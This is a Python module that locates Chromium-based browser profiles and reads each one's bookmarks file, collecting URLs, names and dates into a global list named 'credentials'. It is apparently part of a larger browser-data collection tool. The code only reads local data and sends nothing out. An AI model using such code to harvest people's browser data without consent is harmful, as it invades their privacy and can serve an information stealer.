
# Import modules
from os import path
from json import load
from . import ConvertDate, GetBrowsers

""" Fetch bookmarks from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        bookmarksFile = browser + "\\Bookmarks"
        if not path.exists(bookmarksFile):
            continue
        else:
            with open(bookmarksFile, "r", encoding="utf8", errors="ignore") as file:
                bookmarks = load(file)["roots"]["bookmark_bar"]["children"]

        for row in bookmarks:
            bookmark = {
                "hostname": row["url"],
                "name": row["name"],
                "date_added": ConvertDate(row["date_added"])
            }
            credentials.append(bookmark)

    return credentials
